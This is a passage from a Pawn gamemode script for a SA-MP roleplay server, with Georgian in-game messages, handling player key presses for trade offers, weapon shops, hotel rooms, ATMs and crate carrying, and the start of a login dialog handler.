				SetPVarInt(playerid,"repairprice",0);
				SetPVarInt(offer,"repairoffee",0);
				new vehicleid = GetPlayerVehicleID(playerid);
				if(!vehicleid) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Avtomobilshi");
				if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
				TransferMoney(playerid,offer,price);
				SetVehicleHealthEx(vehicleid,1000.0);
				RepairVehicle(vehicleid);
				SFCM(playerid,CBLUE,"Tqven Gaaremontet Manqana Fasad: $%d",price);
				SFCM(offer,CBLUE,"Avtomobili Garemontda Fasad: $%d",price);
			}
		}
		if(GetPVarInt(playerid,"gunoffee") == playerid && GetPVarInt(playerid,"gunoffer") != playerid)
		{
			new offer = GetPVarInt(playerid,"gunoffer");
			new price = GetPVarInt(playerid,"gunprice");
			new needammo = GetPVarInt(playerid,"gunammo");
			new weaponid = GetPVarInt(playerid,"gunid");
			if(GetPVarInt(offer,"gunoffee") == playerid)
			{
				SetPVarInt(playerid,"gunoffee",0);
				SetPVarInt(playerid,"gunoffer",0);
				SetPVarInt(playerid,"gunammo",0);
				SetPVarInt(playerid,"gunprice",0);
				SetPVarInt(playerid,"gunid",0);
				SetPVarInt(offer,"gunoffee",0);
				new slot = GetWeaponSlot(weaponid);
				new weapon,ammo;
				GetPlayerWeaponData(offer,slot,weapon,ammo);
				if(weapon != weaponid || ammo < needammo) return SendClientMessage(playerid,CGRAY,"Gamyidvels, Daumtavrda Iaragi.");
				new remain = ammo - needammo;
				if(remain > ammo) return true;
				if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
				pData[offer][pAmmo] += remain;
				UpdatePlayerData(offer,"ammo",pData[offer][pAmmo]);
				GivePlayerWeaponEx(playerid,weaponid,needammo);
				SetPlayerAmmoEx(offer,weaponid,0);
				SetPlayerArmedWeapon(offer,0);
				TransferMoney(playerid,offer,price);
				format(mes,sizeof(mes),"Miyida Iaragi: %s",Name2(playerid));
				MeAction(offer,mes);
				Pokaz(offer,2,remain,1);
				SendClientMessage(offer,CGREEN,"Tqven Gayidet Iaragi, Xolo Darchenili Tyviebi Dagibrundat Tqven.");
			}
		}
		else if(GetPVarInt(playerid,"selectpoint") == 2)
		{

			new driverid = GetPVarInt(playerid,"taxidriver");
			if(GetPlayerState(playerid) != PLAYER_STATE_PASSENGER || GetPlayerVehicleID(playerid) != pTemp[driverid][pTaxiID])
			{
				SetPVarInt(playerid,"selectpoint",0);
				SetPVarInt(playerid,"taxidriver",0);
				RemovePlayerMapIcon(playerid,iconTaxi);
			}
			new Float:x, Float:y;
			x = GetPVarFloat(playerid,"selectpointX");
			y = GetPVarFloat(playerid,"selectpointY");
			SetPlayerMapIcon(driverid,iconTaxi,x,y,0.0,0,CYELLOW,1);
			SetPVarFloat(playerid,"selectpointX",x);
			SetPVarFloat(playerid,"selectpointY",y);
			SetPVarInt(playerid,"selectpoint",0);
			SetPVarInt(driverid,"selectpoint",0);
			SendClientMessage(playerid,CINFO,"Monacemebi Gamodzaxebastan Dakavshirebit Taqsistan Gaigzavna");
			SendClientMessage(driverid,CINFO,"Samgzavro Agnishvna {"#cYELLOW"}Moinishna {"#cINFO"}Rukaze. Monishvnis Gasauqmeblad: {"#cWHITE"}/untaxi");
		}
	}
	if(newkeys & KEY_NO)
	{
	    if(GetPVarInt(playerid,"Wed") == 2)
	    {
	        SendClientMessage(playerid,CBLUE,"Tqven Uaryavit Moyvanastan Dakavshirebuli Shetavazeba");
		    SendClientMessage(WeddingTwo[playerid],CBLUE,"Winadadeba Uaryo Colad Gayolis Taobaze");
		    WeddingTwo[playerid] = -1;
		    SetPVarInt(playerid,"Wed",0);
	    }
		if(pTemp[playerid][pShowPassact] == playerid)
	    {
			SendClientMessage(playerid,-1,"Tqven Ganacxadet Uari");
			SendClientMessage(pTemp[playerid][pShowPasspl],-1,"Motamashem Uari Ganacxada");
			pTemp[playerid][pShowPassact] = -1;
	    }
	    if(pTemp[playerid][pShowSkillact] == playerid)
	    {
			SendClientMessage(playerid,-1,"Tqven Ganacxadet Uari");
			SendClientMessage(pTemp[playerid][pShowSkillpl],-1,"Motamashem Uari Ganacxada");
			pTemp[playerid][pShowSkillact] = -1;
	    }
	    if(pTemp[playerid][pShowLicact] == playerid)
	    {
			SendClientMessage(playerid,-1,"Tqven Ganacxadet Uari");
			SendClientMessage(pTemp[playerid][pShowLicpl],-1,"Motamashem Uari Ganacxada");
			pTemp[playerid][pShowLicact] = -1;
	    }
		if(playerid == pTemp[playerid][pSellHouseOffee])
		{
			new offerid = pTemp[playerid][pSellHouseOffer];
			SendClientMessage(playerid,CGRAY,"Tqven Argusrt Sakutari Saxlis Shedzena");
			SendClientMessage(offerid,CGRAY,"Myidveli Uarzea Rom Iyidos Saxli");
			pTemp[offerid][pSellHouseOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellHouseOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellHouseOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellHousePrice] = 0;
			pTemp[playerid][pSellHouseID] = 0;
		}
		if(pTemp[playerid][pSellBusinessOffee] == playerid)
		{
			new offerid = pTemp[playerid][pSellBusinessOffer];
			SendClientMessage(playerid,CGRAY,"Tqven Argusrt Sakutari Biznesis Shedzena");
			SendClientMessage(offerid,CGRAY,"Myidveli Uarzea Rom Iyidos Biznesi");
			pTemp[offerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellBusinessOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellBusinessOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellBusinessPrice] = 0;
			pTemp[playerid][pSellBusinessID] = 0;
		}
		else if(pTemp[playerid][pSellCarOffee] == playerid)
		{
			new offerid = pTemp[playerid][pSellCarOffer];
			SendClientMessage(playerid,CGRAY,"Tqven Argusrt Sakutari Manqanis Shedzena");
			SendClientMessage(offerid,CGRAY,"Myidveli Uarzea Rom Iyidos Manqana");
			pTemp[offerid][pSellCarOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellCarOffer] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellCarOffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pSellCarPrice] = 0;
			pTemp[playerid][pSellCarID] = 0;
		}
		if(GetPVarInt(playerid,"repairoffee") == playerid)
		{
			new offer = GetPVarInt(playerid,"repairoffer");
			if(GetPVarInt(offer,"repairoffee") == playerid)
			{
				SetPVarInt(playerid,"repairoffee",-1);
				SetPVarInt(playerid,"repairoffer",-1);
				SetPVarInt(playerid,"repairprice",0);
				SetPVarInt(offer,"repairoffee",0);
				SendClientMessage(playerid,CBLUE,"Tqven Tqvit Uari Remontze");
				SendClientMessage(offer,CBLUE,"Klienti Uarzea Remontis Shekvetaze");
			}
		}
		else StatisticData(playerid);
	}
	if (newkeys & KEY_WALK)
	{
	    if(GetPlayerVirtualWorld(playerid) == 6)
		{
			if(IsPlayerInRangeOfPoint(playerid, 1.0, -4.6460,389.2099,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"Silenced Colt 45\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}150\n{FFFFFF}Girebuleba: {31B522}2700$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, -4.2930,383.2103,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun1,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"Desert Eagle\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}90\n{FFFFFF}Girebuleba: {31B522}3200$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, -7.1549,387.3505,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun3,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"MP5\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}150\n{FFFFFF}Girebuleba: {31B522}3500$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, -1.7310,386.5650,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun4,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"Shotgun\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}60\n{FFFFFF}Girebuleba: {31B522}4000$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, -4.2970,386.5428,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun5,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"Baseball Bat\"\n{FFFFFF}Girebuleba: {31B522}$100","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, 0.8463,387.4106,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun6,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"Sniper\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}40\n{FFFFFF}Girebuleba: {31B522}6000$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, 0.2692,389.2097,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun7,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"M4\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}200\n{FFFFFF}Girebuleba: {31B522}4200$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, -6.5778,389.2104,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun8,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n\"AK-47\"\n{FFFFFF}Tyviebis Raodenoba: {E2880E}200\n{FFFFFF}Girebuleba: {31B522}4200$","Yidva","Uaryofa");
			}
			else if (IsPlayerInRangeOfPoint(playerid, 1.0, -1.7590,382.9603,1043.7756)) {
				ShowPlayerDialog(playerid,dBuygun9,DIALOG_STYLE_MSGBOX,"{1B8E06}Airchiet Iaragi","{FFFFFF}Gsurt Sheidzinot Es Iaragi ?\n\n{FFFFFF}Girebuleba: {31B522}1000$","Yidva","Uaryofa");
			}
		}
		if(GetPlayerVirtualWorld(playerid) == 1 || GetPlayerVirtualWorld(playerid) == 2 || GetPlayerVirtualWorld(playerid) == 3)
  	    {
	  	    if(PlayerToPoint(2.0,playerid,1708.7024,-1670.2324,23.7057))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 1) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №1");
                if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
				SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
 			}
	  	    if(PlayerToPoint(2.0,playerid,1708.7043,-1665.0304,23.7044))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 2) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №2");
                if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
				SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7029,-1659.8270,23.7031))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 3) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №3");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7021,-1654.5770,23.7018))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 4) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №4");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7019,-1649.3079,23.6953))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 5) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №5");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0483,-1642.2540,23.7578))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 6) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №6");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0646,-1648.1945,23.7448))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 7) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №7");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0820,-1654.0867,23.7318))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 8) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №8");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0988,-1660.0123,23.7188))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 9) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №9");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7017,-1670.2111,27.1953))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 10) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №10");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7028,-1665.0184,27.1953))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 11) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №11");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7098,-1659.7622,27.1953))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 12) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №12");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7083,-1654.5234,27.1953))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 13) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №13");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1708.7184,-1649.2904,27.1953))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 14) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №14");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0482,-1642.3508,27.2392))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 15) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №15");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0631,-1648.2434,27.2304))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 16) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №16");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0767,-1654.1727,27.2216))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 17) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №17");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
	  	    if(PlayerToPoint(2.0,playerid,1735.0927,-1660.0815,27.2128))
	  	    {
	  	        if(pData[playerid][pOtelNomer] != 18) return SendClientMessage(playerid,CBLUE,"Tqven Arxart Sastumroshi Amotaxis Mplobeli №18");
	  	        if(GetPlayerVirtualWorld(playerid) != pData[playerid][pOtel]) return SendClientMessage(playerid,CBLUE,"Tqven Arcxovrobt Am Sastumroshi");
                SetPlayerPos(playerid,-2168.4741,642.1261,1057.5938);
  	    		SetPlayerInterior(playerid, 1);
  	    		SetPlayerVirtualWorld(playerid,playerid);
	  	    }
		}
	    if(GetPVarInt(playerid,"IsInKamera") == 2)
	    {
	        if(PlayerToPoint(2.0,playerid,-310.6909,-257.2500,1082.7289))
			{
			    SetPlayerPos(playerid,-307.6929,-256.9103,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-310.6935,-262.6185,1082.7289))
			{
			    SetPlayerPos(playerid,-307.9105,-262.6128,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-310.6912,-267.9289,1082.7289))
			{
			    SetPlayerPos(playerid,-307.3654,-268.0378,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-310.7006,-273.1307,1082.7289))
			{
			    SetPlayerPos(playerid,-307.3427,-273.4765,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-319.0814,-257.3622,1082.7289)) // 5
			{
			    SetPlayerPos(playerid,-321.5524,-257.2225,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-319.0825,-262.6073,1082.7289))
			{
			    SetPlayerPos(playerid,-321.7930,-262.7053,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-319.0825,-267.8094,1082.7289))
			{
			    SetPlayerPos(playerid,-321.8169,-268.1629,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
			if(PlayerToPoint(2.0,playerid,-319.0816,-273.3595,1082.7289)) // 8
			{
			    SetPlayerPos(playerid,-322.0327,-273.5317,1082.7289);
			    SetPVarInt(playerid,"IsInKamera",3);
			}
		}
	    if(GetPVarInt(playerid,"IsInHouse") == 1)
		{
			new houseid = pTemp[playerid][pSelectedHouseID];
			new hint = gHouses[houseid][houseHint];
			new Float:x, Float:y, Float:z;
			x = gHints[hint][hintX];
			y = gHints[hint][hintY];
			z = gHints[hint][hintZ];
			if(IsPlayerInRangeOfPoint(playerid,2.0,x,y,z))
			{
			    if(gHouses[houseid][houseImprove][0])
				{
					SetPlayerInterior(playerid,0);
					SetPlayerVirtualWorld(playerid,0);
					SetPVarInt(playerid,"JustTP",1);
					SetPlayerPos(playerid,gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ]);
					SetPlayerFacingAngle(playerid,gHouses[houseid][houseR]);
					SetPVarInt(playerid,"IsInHouse",0);
				}
				else SendClientMessage(playerid, CGRAY, "Saxlshi Araris Gaketebuli 'Avtomaturi Karebi'. Daweret /exit.");
			}
		}
	}
	if (newkeys & KEY_SECONDARY_ATTACK)
	{
		if(GetPVarInt(playerid,"SelectStoreGun") == 1)
		{
			new Float:x, Float:y, Float:z, Float:x1, Float:y1, Float:z1;
			x = GetPVarFloat(playerid,"oldcx");
			y = GetPVarFloat(playerid,"oldcy");
			z = GetPVarFloat(playerid,"oldcz");
			GetPlayerCameraPos(playerid,x1,y1,z1);
			InterpolateCameraPos(playerid,x1,y1,z1,x,y,z,700,CAMERA_MOVE);
			SetTimerEx("SetCameraBehindPlayerDelay",1000,false,"i",playerid);
			SetPVarInt(playerid,"SelectStoreGun",0);
			pTemp[playerid][pStoreGun] = 0;
			GameTextForPlayer(playerid," ",100,3);
			TogglePlayerControllable(playerid,1);
		}
		if(GetPVarInt(playerid,"ChangingSkin") == 1)
		{
			SetPVarInt(playerid,"ChangingSkin",0);
			SetPlayerSkin(playerid,pData[playerid][pSkin]);
			SetPlayerVirtualWorld(playerid,1);
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid,1);
			SetPVarInt(playerid,"JustTP",1);
			GameTextForPlayer(playerid,"_",200,3);
		}
	}
	if(newkeys == 1024)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
		    for(new i;i<ATM_COUNT;i++)
			{
				if(IsPlayerInDynamicArea(playerid,gATMArea[i]))
				{
					ShowPlayerDialog(playerid,dBank,2,"{"#cYELLOW"}Sabanko Momsaxureba","1. Balansi\n2. Tanxis Gamotana\n3. Tanxis Shetana\n4. Saxelmwifo Gadasaxadebi\n5. Biznesis Gadasaxadebi","Archeva","Daxurva");
				}
			}
		}
 	}
	if (newkeys & KEY_CTRL_BACK)
	{
	    //printf("OnPlayerKeyStateChange(%d, %d, %d) (7)",playerid, newkeys, oldkeys);
		if(IsGang(pData[playerid][pFraction]) && IsPlayerInDynamicArea(playerid,gAreas[arArmyAmmo]))
		{
			if(GetPVarInt(playerid,"carrygun")) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Iaragis Yuti.");
			new armyid = GetPlayerVirtualWorld(playerid);
			if(gArmyWarehouse[armyid][0] < 100 && gArmyWarehouse[armyid][0] < 100) return SendClientMessage(playerid,CGRAY,"Arasamtavrobo Narcheni Sabrdzolo Masalis Sawyobshi");
			if(gArmyWarehouse[armyid][0] >= 100)
			{
				gArmyWarehouse[armyid][0] -= 100;
				SetPVarInt(playerid,"carrygun",100);
			}
			if(gArmyWarehouse[armyid][1] >= 100)
			{
				gArmyWarehouse[armyid][1] -= 100;
				SetPVarInt(playerid,"carryammo",100);
			}
			WHDataUpdate();
			SetPlayerFacingAngle(playerid,270.0);
			ClearAnimations(playerid);
			ApplyAnimation(playerid,"CARRY","liftup",1.0,0,1,1,0,0,1);
			SetTimerEx("CarryDelay",1000,false,"i",playerid);
			SetPlayerAttachedObject(playerid,0,2358,6,0.0,0.10,-0.2, -110.0,0.0,78.0);

		}
		if((pData[playerid][pFraction] == 8 || pData[playerid][pFraction] == 9) && IsPlayerInDynamicArea(playerid,gAreas[arZavodSklad2]))
		{
			if(!GetPVarInt(playerid,"carrygun"))
			{
				SetPlayerFacingAngle(playerid,270.0);
				ClearAnimations(playerid);
				ApplyAnimation(playerid,"CARRY","liftup",1.0,0,1,1,0,0,1);
				SetTimerEx("CarryDelay",1000,false,"i",playerid);
				SetPlayerAttachedObject(playerid,0,2358,6,0.0,0.10,-0.2, -110.0,0.0,78.0);
				SetPVarInt(playerid,"carrygun",500);
			}
		}
	}
	if (newkeys & KEY_FIRE)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(vehicleid) ToggleLamp(vehicleid);
		}
	}
	return true;
}

public OnRconCommand(cmd[]) return false;
public OnRconLoginAttempt(ip[], password[], success) return false;
public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if(gVehicles[vehicleid-1][vLock]) SetVehicleParamsForPlayer(vehicleid,forplayerid,0,1);
	else SetVehicleParamsForPlayer(vehicleid,forplayerid,0,0);
	GetVehiclePos(vehicleid, gVehicles[vehicleid - 1][vX], gVehicles[vehicleid - 1][vY], gVehicles[vehicleid - 1][vZ]);
	GetVehicleZAngle(vehicleid, gVehicles[vehicleid - 1][vA]);
	return true;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(GetPVarInt(playerid, "DialogID") != dialogid) return true;
	SetPVarInt(playerid, "DialogID", -2);
	strreplace(inputtext, '%', '#');
	if(strlen(inputtext) && (strfind(inputtext,"`") != -1 ||
	strfind(inputtext,"'") != -1 )) return SendClientMessage(playerid,CGRAY,"Textshi Iqna Napovni Mcdari Simbolo.");
	switch(dialogid)
	{
		case dLogin:
		{
			if(!response)
			{
				SendClientMessage(playerid,CWHITE,"Dawere /q Tamashis Gasatishad.");
				NewKick(playerid);
			}
			else if(!strlen(inputtext)) SPFD(playerid,dLogin,3,"{FF0000}Avtorizacia","NEXT","EXIT","{"#cWHITE"}\tMogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Name: {EBC9C9}%s{"#cWHITE"}\n\n\tAccount Registrirebulia.\nAvtorizaciisatvis Miutitet Tqveni Paroli:",pRegData[playerid][0]);
			else
			{
				if(!strcmp(inputtext,pRegData[playerid][1],false,MAX_PLAYER_NAME))
				{
					new code[24];
					GetPVarString(playerid,"code",code,24);
					if(!strlen(code))
					{
						DeletePVar(playerid,"code");
						format(mes,sizeof(mes),"Avtorizacia Gavlilia | Saxeli : %s .",Name2(playerid));
						SendClientMessage(playerid,0x739F95FF,mes);
